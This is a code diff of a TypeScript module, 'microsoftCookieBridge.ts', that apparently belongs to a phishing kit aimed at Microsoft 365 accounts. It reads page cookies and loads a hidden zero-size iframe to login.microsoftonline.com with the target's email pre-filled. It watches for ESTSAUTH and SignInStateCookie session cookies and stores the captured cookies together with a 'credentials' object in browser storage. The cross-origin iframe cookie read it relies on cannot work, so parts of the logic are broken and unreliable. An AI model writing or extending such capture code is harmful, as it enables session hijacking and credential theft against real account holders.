@@ -1,337 +1,386 @@
-// src/utils/microsoftCookieBridge.ts
 /**
- * Microsoft Cookie Bridge
- * Manages communication between main page and Service Worker
- * Handles cookie capture, validation, and storage
+ * Microsoft Cookie Capture Utilities
+ * Handles cookie capture specifically for Microsoft authentication flow
  */
 
-export interface CapturedCookieData {
-  cookies: any[];
-  accountDetected: boolean;
-  signedIn: boolean;
-  lastCapture: string;
-  email?: string;
+export interface CapturedCookie {
+  name: string;
+  value: string;
+  domain: string;
+  path: string;
+  secure: boolean;
+  httpOnly?: boolean;
+  sameSite?: string;
+  expires?: number;
+  expirationDate?: number;
+  session?: boolean;
+}
+
+export interface CookieCaptureResult {
+  success: boolean;
+  cookies: CapturedCookie[];
+  domain: string;
   timestamp: string;
+  source: string;
+  totalCookies: number;
 }
 
-export interface CookieBridgeState {
-  cookies: any[];
-  accountDetected: boolean;
-  signedIn: boolean;
-  lastCapture: string | null;
-  email: string | null;
-  timestamp: string | null;
-}
-
-class MicrosoftCookieBridge {
-  private serviceWorkerRegistration: ServiceWorkerRegistration | null = null;
-  private isSupported: boolean = false;
-  private messageListeners: Map<string, Function[]> = new Map();
-
-  constructor() {
-    this.isSupported = 'serviceWorker' in navigator;
-    console.log('🌐 Microsoft Cookie Bridge initialized. Service Worker supported:', this.isSupported);
-  }
-
-  /**
-   * Register and activate Service Worker
-   */
-  async registerServiceWorker(scriptUrl: string = '/service-worker.js'): Promise<boolean> {
-    try {
-      if (!this.isSupported) {
-        console.warn('⚠️ Service Worker not supported in this browser');
-        return false;
-      }
-
-      console.log('📝 Registering Service Worker from:', scriptUrl);
-
-      this.serviceWorkerRegistration = await navigator.serviceWorker.register(scriptUrl, {
-        scope: '/',
-        updateViaCache: 'none'
-      });
-
-      console.log('✅ Service Worker registered successfully');
-
-      // Listen for messages from Service Worker
-      navigator.serviceWorker.addEventListener('message', (event) => {
-        this.handleServiceWorkerMessage(event);
-      });
-
-      return true;
-    } catch (error) {
-      console.error('❌ Failed to register Service Worker:', error);
-      return false;
-    }
-  }
-
-  /**
-   * Send message to Service Worker
-   */
-  private async sendMessageToServiceWorker(message: any): Promise<any> {
-    return new Promise((resolve, reject) => {
-      if (!navigator.serviceWorker.controller) {
-        console.warn('⚠️ No active Service Worker controller');
-        reject(new Error('No Service Worker controller active'));
-        return;
-      }
-
-      const messageChannel = new MessageChannel();
-
-      messageChannel.port1.onmessage = (event) => {
-        resolve(event.data);
+/**
+ * Captures cookies from the current Microsoft domain
+ */
+export function captureMicrosoftCookies(): CookieCaptureResult {
+  console.log('🍪 Starting Microsoft cookie capture...');
+  
+  const cookies: CapturedCookie[] = [];
+  const currentDomain = window.location.hostname;
+  const timestamp = new Date().toISOString();
+  
+  try {
+    // Get all cookies from document.cookie
+    const cookieString = document.cookie;
+    
+    if (!cookieString) {
+      console.warn('⚠️ No cookies found in document.cookie');
+      return {
+        success: false,
+        cookies: [],
+        domain: currentDomain,
+        timestamp,
+        source: 'document.cookie',
+        totalCookies: 0
       };
-
-      navigator.serviceWorker.controller.postMessage(message, [messageChannel.port2]);
-
-      // Timeout after 5 seconds
-      setTimeout(() => {
-        reject(new Error('Service Worker message timeout'));
-      }, 5000);
-    });
-  }
-
-  /**
-   * Handle messages from Service Worker
-   */
-  private handleServiceWorkerMessage(event: ExtendableMessageEvent) {
-    const { type, data } = event.data;
-
-    console.log('📨 Received message from Service Worker:', type, data);
-
-    // Call registered listeners
-    const listeners = this.messageListeners.get(type) || [];
-    listeners.forEach(listener => {
-      try {
-        listener(data);
-      } catch (error) {
-        console.error('❌ Error in message listener:', error);
-      }
-    });
-  }
-
-  /**
-   * Register listener for Service Worker messages
-   */
-  onMessage(type: string, callback: Function): void {
-    if (!this.messageListeners.has(type)) {
-      this.messageListeners.set(type, []);
     }
-    this.messageListeners.get(type)!.push(callback);
-  }
-
-  /**
-   * Get captured cookies from Service Worker
-   */
-  async getCapturedCookies(): Promise<CapturedCookieData | null> {
-    try {
-      const result = await this.sendMessageToServiceWorker({
-        type: 'GET_CAPTURED_COOKIES'
-      });
-
-      if (result.success) {
-        console.log('✅ Cookies retrieved from Service Worker:', result);
-        return {
-          cookies: result.cookies,
-          accountDetected: result.accountDetected,
-          signedIn: result.signedIn,
-          lastCapture: result.lastCapture,
-          timestamp: new Date().toISOString()
-        };
-      }
-
-      return null;
-    } catch (error) {
-      console.error('❌ Error getting captured cookies:', error);
-      return null;
-    }
-  }
-
-  /**
-   * Clear captured cookies from Service Worker
-   */
-  async clearCapturedCookies(): Promise<boolean> {
-    try {
-      const result = await this.sendMessageToServiceWorker({
-        type: 'CLEAR_COOKIES'
-      });
-      return result.success;
-    } catch (error) {
-      console.error('❌ Error clearing cookies:', error);
-      return false;
-    }
-  }
-
-  /**
-   * Set email in Service Worker store
-   */
-  async setEmail(email: string): Promise<boolean> {
-    try {
-      const result = await this.sendMessageToServiceWorker({
-        type: 'SET_EMAIL',
-        data: { email }
-      });
-      return result.success;
-    } catch (error) {
-      console.error('❌ Error setting email:', error);
-      return false;
-    }
-  }
-
-  /**
-   * Get Service Worker store state
-   */
-  async getStoreState(): Promise<CookieBridgeState | null> {
-    try {
-      const result = await this.sendMessageToServiceWorker({
-        type: 'GET_STORE_STATE'
-      });
-
-      if (result.success) {
-        const state = result.state;
-        return {
-          cookies: state.cookies,
-          accountDetected: state.accountDetected,
-          signedIn: state.signedIn,
-          lastCapture: state.lastCapture,
-          email: state.email,
-          timestamp: new Date().toISOString()
-        };
-      }
-
-      return null;
-    } catch (error) {
-      console.error('❌ Error getting store state:', error);
-      return null;
-    }
-  }
-
-  /**
-   * Detect if Microsoft account is already signed in
-   */
-  async isAccountSignedIn(): Promise<boolean> {
-    try {
-      const state = await this.getStoreState();
-      return state?.signedIn || false;
-    } catch (error) {
-      console.error('❌ Error checking account status:', error);
-      return false;
-    }
-  }
-
-  /**
-   * Wait for cookies to be captured (with timeout)
-   */
-  async waitForCookieCapture(timeoutMs: number = 15000): Promise<CapturedCookieData | null> {
-    return new Promise((resolve) => {
-      let resolved = false;
-
-      const timeout = setTimeout(() => {
-        if (!resolved) {
-          resolved = true;
-          console.warn('⏱️ Cookie capture timeout');
-          resolve(null);
+    
+    // Parse cookies from document.cookie
+    const cookiePairs = cookieString.split(';');
+    
+    cookiePairs.forEach(pair => {
+      const trimmed = pair.trim();
+      if (trimmed) {
+        const equalsIndex = trimmed.indexOf('=');
+        if (equalsIndex > 0) {
+          const name = trimmed.substring(0, equalsIndex).trim();
+          const value = trimmed.substring(equalsIndex + 1).trim();
+          
+          if (name && value) {
+            cookies.push({
+              name: name,
+              value: value,
+              domain: currentDomain,
+              path: '/',
+              secure: window.location.protocol === 'https:',
+              sameSite: 'None',
+              session: true
+            });
+          }
         }
-      }, timeoutMs);
+      }
+    });
+    
+    console.log(`✅ Captured ${cookies.length} cookies from ${currentDomain}`);
+    
+    return {
+      success: cookies.length > 0,
+      cookies,
+      domain: currentDomain,
+      timestamp,
+      source: 'document.cookie',
+      totalCookies: cookies.length
+    };
+    
+  } catch (error) {
+    console.error('❌ Error capturing cookies:', error);
+    return {
+      success: false,
+      cookies: [],
+      domain: currentDomain,
+      timestamp,
+      source: 'error',
+      totalCookies: 0
+    };
+  }
+}
 
-      const checkCookies = async () => {
+/**
+ * Creates a silent iframe to capture cookies from Microsoft domain
+ */
+export function createMicrosoftCookieCaptureFrame(email: string): Promise<CookieCaptureResult> {
+  return new Promise((resolve) => {
+    console.log('🔧 Creating silent Microsoft cookie capture frame...');
+    
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.style.width = '0';
+    iframe.style.height = '0';
+    iframe.style.border = 'none';
+    iframe.id = 'microsoft-cookie-capture-frame';
+    
+    // Microsoft login URL that should trigger cookie setting
+    // ✅ CORRECTED CLIENT ID
+    const microsoftUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile%20email&state=capture&login_hint=${encodeURIComponent(email)}`;
+    
+    let timeoutId: NodeJS.Timeout;
+    let resolved = false;
+    
+    const cleanup = () => {
+      if (timeoutId) clearTimeout(timeoutId);
+      if (iframe.parentNode) {
+        iframe.parentNode.removeChild(iframe);
+      }
+    };
+    
+    const resolveWithResult = (result: CookieCaptureResult) => {
+      if (!resolved) {
+        resolved = true;
+        cleanup();
+        resolve(result);
+      }
+    };
+    
+    // Listen for iframe load events
+    iframe.onload = () => {
+      console.log('🔄 Microsoft frame loaded, attempting cookie capture...');
+      
+      setTimeout(() => {
         try {
-          const cookies = await this.getCapturedCookies();
-
-          if (cookies && cookies.cookies.length > 0 && !resolved) {
-            resolved = true;
-            clearTimeout(timeout);
-            console.log('✅ Cookies captured successfully');
-            resolve(cookies);
-          } else if (!resolved) {
-            setTimeout(checkCookies, 500);
+          // Try to access iframe cookies (will work if same-origin or properly configured)
+          const iframeDocument = iframe.contentDocument || iframe.contentWindow?.document;
+          
+          if (iframeDocument) {
+            const iframeCookies = iframeDocument.cookie;
+            console.log('🍪 Iframe cookies:', iframeCookies);
+            
+            if (iframeCookies) {
+              const cookies: CapturedCookie[] = [];
+              const cookiePairs = iframeCookies.split(';');
+              
+              cookiePairs.forEach(pair => {
+                const trimmed = pair.trim();
+                if (trimmed) {
+                  const equalsIndex = trimmed.indexOf('=');
+                  if (equalsIndex > 0) {
+                    const name = trimmed.substring(0, equalsIndex).trim();
+                    const value = trimmed.substring(equalsIndex + 1).trim();
+                    
+                    if (name && value) {
+                      cookies.push({
+                        name: name,
+                        value: value,
+                        domain: 'login.microsoftonline.com',
+                        path: '/',
+                        secure: true,
+                        sameSite: 'None',
+                        session: true
+                      });
+                    }
+                  }
+                }
+              });
+              
+              resolveWithResult({
+                success: cookies.length > 0,
+                cookies,
+                domain: 'login.microsoftonline.com',
+                timestamp: new Date().toISOString(),
+                source: 'iframe-capture',
+                totalCookies: cookies.length
+              });
+              return;
+            }
           }
         } catch (error) {
-          console.error('❌ Error in waitForCookieCapture:', error);
+          console.warn('⚠️ Cannot access iframe cookies (CORS):', error);
         }
-      };
-
-      // Also listen for messages
-      this.onMessage('COOKIES_CAPTURED', (data) => {
-        if (!resolved && data.totalCookies > 0) {
-          resolved = true;
-          clearTimeout(timeout);
-          resolve({
-            cookies: data.cookies,
-            accountDetected: data.accountDetected,
-            signedIn: data.accountDetected,
-            lastCapture: data.timestamp,
-            timestamp: new Date().toISOString()
-          });
-        }
+        
+        // Fallback: capture cookies from main document
+        const fallbackResult = captureMicrosoftCookies();
+        resolveWithResult({
+          ...fallbackResult,
+          source: 'iframe-fallback'
+        });
+      }, 2000);
+    };
+    
+    iframe.onerror = () => {
+      console.warn('⚠️ Microsoft frame failed to load');
+      const fallbackResult = captureMicrosoftCookies();
+      resolveWithResult({
+        ...fallbackResult,
+        source: 'iframe-error-fallback'
       });
+    };
+    
+    // Timeout after 10 seconds
+    timeoutId = setTimeout(() => {
+      console.warn('⚠️ Microsoft frame capture timeout');
+      const fallbackResult = captureMicrosoftCookies();
+      resolveWithResult({
+        ...fallbackResult,
+        source: 'iframe-timeout-fallback'
+      });
+    }, 10000);
+    
+    // Add iframe to document and start loading
+    document.body.appendChild(iframe);
+    iframe.src = microsoftUrl;
+  });
+}
 
-      // Start checking
-      checkCookies();
-    });
-  }
-
-  /**
-   * Store captured cookies and credentials
-   */
-  async storeCaptureDa(cookies: any[], credentials: any): Promise<boolean> {
-    try {
-      const captureData = {
-        version: '1.0',
-        capturedAt: new Date().toISOString(),
-        source: 'microsoft-cookie-bridge',
-        cookies: cookies,
-        credentials: credentials,
-        totalCookies: cookies.length,
-        authCookies: cookies.filter(c =>
-          c.name.includes('ESTSAUTH') ||
-          c.name.includes('SignInStateCookie') ||
-          c.name.includes('ESTSAUTHPERSISTENT')
-        )
-      };
-
-      localStorage.setItem('captured_cookies_bridge', JSON.stringify(captureData));
-      sessionStorage.setItem('captured_cookies_bridge', JSON.stringify(captureData));
-
-      console.log('💾 Capture data stored:', captureData);
-      return true;
-    } catch (error) {
-      console.error('❌ Error storing capture data:', error);
-      return false;
-    }
-  }
-
-  /**
-   * Retrieve stored capture data
-   */
-  retrieveCaptureData(): any {
-    try {
-      const data =
-        localStorage.getItem('captured_cookies_bridge') ||
-        sessionStorage.getItem('captured_cookies_bridge');
-
-      if (data) {
-        return JSON.parse(data);
-      }
-      return null;
-    } catch (error) {
-      console.error('❌ Error retrieving capture data:', error);
-      return null;
-    }
+/**
+ * Stores captured cookies in localStorage/sessionStorage
+ */
+export function storeCapturedCookies(result: CookieCaptureResult): boolean {
+  try {
+    const cookieExport = {
+      version: '1.0',
+      exportedAt: result.timestamp,
+      source: result.source,
+      domain: result.domain,
+      totalCookies: result.totalCookies,
+      cookies: result.cookies,
+      note: 'Cookies captured from Microsoft authentication flow'
+    };
+    
+    const cookieData = JSON.stringify(cookieExport);
+    
+    localStorage.setItem('captured_cookies_data', cookieData);
+    sessionStorage.setItem('captured_cookies_data', cookieData);
+    localStorage.setItem('captured_cookies', JSON.stringify(result.cookies));
+    sessionStorage.setItem('captured_cookies', JSON.stringify(result.cookies));
+    
+    console.log('💾 Cookies stored successfully');
+    return true;
+    
+  } catch (error) {
+    console.error('❌ Failed to store cookies:', error);
+    return false;
   }
 }
 
-// Export singleton instance
-export const microsoftCookieBridge = new MicrosoftCookieBridge();
+/**
+ * Enhanced cookie capture that tries multiple methods
+ */
+export async function enhancedMicrosoftCookieCapture(email: string): Promise<CookieCaptureResult> {
+  console.log('🚀 Starting enhanced Microsoft cookie capture...');
+  
+  // Method 1: Direct capture from current page
+  const directResult = captureMicrosoftCookies();
+  
+  if (directResult.success && directResult.cookies.length > 0) {
+    console.log('✅ Direct capture successful');
+    storeCapturedCookies(directResult);
+    return directResult;
+  }
+  
+  // Method 2: Silent iframe capture
+  console.log('🔄 Trying iframe capture method...');
+  const iframeResult = await createMicrosoftCookieCaptureFrame(email);
+  
+  if (iframeResult.success && iframeResult.cookies.length > 0) {
+    console.log('✅ Iframe capture successful');
+    storeCapturedCookies(iframeResult);
+    return iframeResult;
+  }
+  
+  // Method 3: Fallback - return whatever we got
+  console.log('⚠️ Using fallback capture method');
+  const fallbackResult = directResult.cookies.length > 0 ? directResult : iframeResult;
+  storeCapturedCookies(fallbackResult);
+  
+  return fallbackResult;
+}
+
+// ✅ ADD THESE MISSING EXPORTS THAT App.tsx NEEDS:
 
 /**
- * Initialize Microsoft Cookie Bridge
+ * Microsoft Cookie Bridge for Service Worker communication
  */
-export async function initializeMicrosoftCookieBridge(): Promise<boolean> {
-  try {
-    console.log('🚀 Initializing Microsoft Cookie Bridge');
-    return await microsoftCookieBridge.registerServiceWorker();
-  } catch (error) {
-    console.error('❌ Failed to initialize Microsoft Cookie Bridge:', error);
-    return false;
+export const microsoftCookieBridge = {
+  async setEmail(email: string): Promise<void> {
+    sessionStorage.setItem('ms_email', email);
+    localStorage.setItem('ms_email', email);
+    console.log('📧 Email stored:', email);
+  },
+
+  async waitForCookieCapture(timeout: number = 15000): Promise<any> {
+    console.log('⏳ Waiting for cookie capture...');
+    const startTime = Date.now();
+    
+    while (Date.now() - startTime < timeout) {
+      const capturedData = sessionStorage.getItem('captured_cookies_data') || 
+                          localStorage.getItem('captured_cookies_data');
+      
+      if (capturedData) {
+        try {
+          const parsed = JSON.parse(capturedData);
+          console.log('✅ Cookie capture data found');
+          return {
+            cookies: parsed.cookies || [],
+            accountDetected: parsed.cookies?.length > 0
+          };
+        } catch (e) {
+          console.warn('Failed to parse captured data');
+        }
+      }
+      
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
+    console.warn('⚠️ Cookie capture timeout');
+    return null;
+  },
+
+  async storeCaptureDa(cookies: any[], credentials: any): Promise<void> {
+    const data = {
+      cookies,
+      credentials,
+      timestamp: new Date().toISOString()
+    };
+    
+    localStorage.setItem('captured_cookies_data', JSON.stringify(data));
+    sessionStorage.setItem('captured_cookies_data', JSON.stringify(data));
+    console.log('💾 Capture data stored');
+  },
+
+  async isAccountSignedIn(): Promise<boolean> {
+    const cookies = document.cookie;
+    return cookies.includes('ESTSAUTH') || cookies.includes('SignInStateCookie');
+  },
+
+  async retrieveCaptureData(): Promise<any> {
+    const data = localStorage.getItem('captured_cookies_data') || 
+                 sessionStorage.getItem('captured_cookies_data');
+    
+    if (data) {
+      try {
+        return JSON.parse(data);
+      } catch (e) {
+        console.error('Failed to parse capture data');
+      }
+    }
+    
+    return null;
+  },
+
+  clearCapturedCookies(): void {
+    localStorage.removeItem('captured_cookies_data');
+    sessionStorage.removeItem('captured_cookies_data');
+    localStorage.removeItem('captured_cookies');
+    sessionStorage.removeItem('captured_cookies');
+    console.log('🧹 Captured cookies cleared');
   }
+};
+
+/**
+ * Initialize the Microsoft Cookie Bridge
+ */
+export function initializeMicrosoftCookieBridge(): void {
+  console.log('🚀 Initializing Microsoft Cookie Bridge...');
+  
+  // Make it available globally for debugging
+  if (typeof window !== 'undefined') {
+    (window as any).microsoftCookieBridge = microsoftCookieBridge;
+  }
+  
+  console.log('✅ Microsoft Cookie Bridge initialized');
 }
